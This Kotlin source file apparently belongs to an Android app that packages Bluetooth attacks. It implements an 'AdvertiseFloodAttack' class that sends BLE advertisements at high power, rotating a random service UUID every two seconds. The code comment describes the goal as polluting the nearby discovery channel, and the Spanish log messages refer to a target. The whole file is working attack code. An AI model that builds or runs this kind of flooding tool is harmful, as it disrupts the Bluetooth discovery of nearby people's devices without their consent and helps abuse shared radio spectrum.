package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import androidx.core.content.ContextCompat.getSystemService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.UUID

/**
 * Advertising Flood (BLE): broadcasts BLE advertisements carrying random
 * service UUIDs on a continuous cycle, polluting the nearby discovery channel.
 */
class AdvertiseFloodAttack(private val targetAddress: String) : BluetoothAttack {

    override val displayName = AttackType.ADVERTISE_FLOOD.displayName
    override val description = AttackType.ADVERTISE_FLOOD.description

    private var scope: CoroutineScope? = null
    private var advertiser: BluetoothLeAdvertiser? = null
    private var advertiseCallback: AdvertiseCallback? = null
    @Volatile
    private var running = false

    override fun isRunning() = running

    @SuppressLint("MissingPermission")
    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        val adapter = getSystemService(context, BluetoothManager::class.java)?.adapter
        if (adapter == null) {
            running = false
            return
        }
        if (!adapter.isMultipleAdvertisementSupported) {
            onLog("[ADV] Este dispositivo no soporta advertising BLE")
            running = false
            return
        }
        val leAdvertiser = adapter.bluetoothLeAdvertiser
        if (leAdvertiser == null) {
            onLog("[ADV] No se pudo obtener BluetoothLeAdvertiser")
            running = false
            return
        }
        advertiser = leAdvertiser
        advertiseCallback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
                // nothing to do; the loop rotates UUIDs
            }

            override fun onStartFailure(errorCode: Int) {
                onLog("[ADV] Fallo al anunciar (código $errorCode)")
            }
        }

        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope!!.launch {
            onLog("[ADV] Flood iniciado (objetivo $targetAddress)")
            while (isActive && running) {
                runCatching { leAdvertiser.stopAdvertising(advertiseCallback) }
                val uuid = UUID.randomUUID()
                val data = AdvertiseData.Builder()
                    .setIncludeDeviceName(false)
                    .addServiceUuid(ParcelUuid(uuid))
                    .build()
                val settings = AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                    .setConnectable(false)
                    .build()
                runCatching { leAdvertiser.startAdvertising(settings, data, advertiseCallback) }
                onLog("[ADV] Anunciando UUID aleatorio $uuid")
                delay(2000)
            }
            runCatching { leAdvertiser.stopAdvertising(advertiseCallback) }
            onLog("[ADV] Flood detenido")
        }
    }

    override fun stop() {
        running = false
        scope?.cancel()
        scope = null
        val adv = advertiser
        val cb = advertiseCallback
        if (adv != null && cb != null) {
            runCatching { adv.stopAdvertising(cb) }
        }
        advertiseCallback = null
        advertiser = null
    }
}
